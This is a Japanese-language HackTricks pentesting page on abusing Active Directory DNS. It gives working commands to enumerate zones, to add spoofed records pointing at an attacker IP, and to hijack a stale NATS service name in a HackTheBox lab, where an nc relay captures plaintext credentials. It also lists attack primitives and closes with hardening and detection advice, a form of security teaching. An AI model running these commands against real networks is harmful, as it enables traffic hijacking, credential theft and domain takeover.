# AD DNSレコード

{{#include ../../banners/hacktricks-training.md}}

デフォルトでは、Active Directory の**すべてのユーザー**が、ドメインまたはフォレストの DNS ゾーン内の**すべての DNS レコードを列挙**できます。これはゾーン転送に似ており、AD 環境の DNS ゾーンの子オブジェクトを一覧表示できます。

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) ツールを使うと、内部ネットワークの偵察を目的として、ゾーン内の**すべての DNS レコードを列挙**して**エクスポート**できます。<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0（2025年4月）では、JSON/Greppable（`--json`）出力、マルチスレッドDNS解決、LDAPSへのバインド時のTLS 1.2/1.3対応が追加されています  

詳細については、[https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup> をお読みください。

---

## レコードの作成 / 変更（ADIDNS spoofing）

**Authenticated Users** グループは、デフォルトでゾーンのDACLに対する **Create Child** 権限を持つため、任意のドメインアカウント（またはコンピューターアカウント）が追加のレコードを登録できます。これは、トラフィックのハイジャック、NTLM relay coercion、さらにはドメインの完全な侵害に利用できます。

### PowerMad / Invoke-DNSUpdate（PowerShell）

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py は Impacket ≥0.12.0 に同梱)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## 一般的な攻撃プリミティブ

1. **ワイルドカードレコード** – `*.<zone>` により、AD DNS server が LLMNR/NBNS spoofing に似た、企業全体への応答機能を持つようになります。これを悪用して NTLM hashes を取得したり、LDAP/SMB に relay したりできます。（WINS-lookup が無効であることが必要です。）<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – `wpad` を追加する（または Global-Query-Block-List を回避するため、attacker host を指す **NS** record を追加する）ことで、送信 HTTP requests を透過的に proxy し、credentials を取得できます。Microsoft は wildcard/DNAME bypasses を patch しました（CVE-2018-8320）が、**NS-records は依然として機能します**。<sup>[[1]](#references)</sup>    
3. **古いエントリの乗っ取り** – 以前 workstation に割り当てられていた IP address を取得すると、関連する DNS entry は引き続きその IP address に解決されます。これにより、DNS に一切触れずに resource-based constrained delegation や Shadow-Credentials attacks が可能になります。    
4. **DHCP → DNS spoofing** – デフォルトの Windows DHCP+DNS deployment では、同じ subnet 上の認証されていない attacker が、dynamic DNS updates を発生させる偽造 DHCP requests を送信して、既存のあらゆる A record（Domain Controllers を含む）を上書きできます（Akamai「DDSpoof」、2023）。これにより Kerberos/LDAP に対する machine-in-the-middle が可能になり、最終的にはドメイン全体の乗っ取りにつながる可能性があります。<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – 自分が制御する machine account の `dNSHostName` を変更し、一致する A record を登録した後、その名前の certificate を要求して DC になりすまします。**Certipy** や **BloodyAD** などの tools を使えば、この一連の流れを完全に自動化できます。  

[serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) を含む AD DNS record は、conditional relay chain の一部となる可能性があります。そのためには、呼び出し元に record の作成権限があり、対象の computer がその名前に対して認証するよう仕向ける coercion path があり、さらにその認証を受け入れる relay destination が必要です。destination の protocol は個別に評価してください。受信接続で SMB signing が有効であっても、それだけでは HTTPS WinRM destination が relay を受け入れるかどうかは判断できません。結果は patch level、name handling、Extended Protection、service configuration によって変わる可能性があります。

---

### 古い動的レコードを介した内部サービスの hijacking（NATS case study）

dynamic updates がすべての認証済みユーザーに許可されている場合、**登録解除されたサービス名を再取得して、attacker のインフラを指すように設定できます**。Mirage HTB DC では DNS scavenging 後も hostname `nats-svc.mirage.htb` が残っていたため、低権限ユーザーであれば誰でも次の操作が可能でした。<sup>[[3]](#references)</sup>

1. `dig` を使って **record が存在しないことを確認**し、SOA を調べます。

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **レコードを再作成**して、自分が管理する外部/VPNインターフェースに向けます。

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **plaintext serviceをなりすます**。NATSクライアントは認証情報を送信する前に`INFO { ... }`バナーを1つ受信することを想定しているため、実際のbrokerから正規のバナーをコピーするだけで、秘密情報を収集できます。

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **取得した creds でピボット** – Mirage では、盗まれた NATS アカウントで JetStream にアクセスでき、そこから再利用可能な AD のユーザー名/パスワードを含む過去の認証イベントを確認できました。

このパターンは、保護されていない TCP handshake に依存する AD 統合サービス（HTTP API、RPC、MQTT など）すべてに当てはまります。DNS レコードが hijack されると、攻撃者がサービスそのものになります。

---

## 検出とハードニング

* 機密性の高いゾーンでは、**Authenticated Users** に *Create all child objects* 権限を与えず、DHCP が使用する専用アカウントに動的更新を委任します。
* 動的更新が必要な場合は、ゾーンを **Secure-only** に設定し、DHCP で **Name Protection** を有効にして、所有者であるコンピューターオブジェクトだけが自身のレコードを上書きできるようにします。
* DNS Server のイベント ID 257/252（動的更新）、770（ゾーン転送）、および `CN=MicrosoftDNS,DC=DomainDnsZones` への LDAP 書き込みを監視します。
* 意図的に無害なレコード、または Global Query Block List を使用して、危険な名前（`wpad`、`isatap`、`*`）をブロックします。
* DNS サーバーにパッチを適用します。たとえば、RCE の脆弱性である CVE-2024-26224 と CVE-2024-26231 は **CVSS 9.8** に達し、Domain Controller に対してリモートから悪用可能です。

## References

- [1] [ADIDNS 再考 - WPAD、GQBL など](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [DHCP DNS Dynamic Updates の悪用による DNS レコードの spoofing](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [ゾーンに侵入する: adidnsdump を使用した Active Directory DNS のダンプ](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
